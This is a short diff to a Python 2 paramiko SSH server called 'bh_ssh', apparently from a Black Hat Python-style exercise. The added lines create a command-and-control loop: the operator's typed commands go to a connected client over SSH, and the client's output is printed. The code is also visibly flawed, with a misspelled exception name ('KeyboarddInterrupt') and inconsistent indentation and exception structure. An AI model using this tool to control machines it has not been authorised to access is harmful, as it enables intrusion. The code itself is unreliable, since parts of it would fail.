@@ -39,4 +39,27 @@ class Server(paramiko.ServerInterface):
 			bhSession.start_server(server=server)
 		except paramiko.SSHException,x:
 			print '[-]SSH negotiation failed.'
-			
+		chan = bhSession.accept(20)
+		print '[+] Authenticated!'
+		print chan.recv(1024)
+		chan.send('welcome to bh_ssh')
+		while True:
+			try:
+				command = raw_input("enter command: ").strip('\n')
+				if command != 'exit':
+					chan.send(command)
+					print chan.recv(1024) + '\n'
+				else:
+					chan.send('exit')
+					print 'exiting'
+					bhSession.close()
+					raise Exception('exit')
+			except KeyboarddInterrupt:
+					bhSession.close()
+	except Exception, e:
+				print '[-]Caught exception: '+str(e)
+				try:
+					bhSession.close()
+				except:
+					pass
+				sys.exit(1)
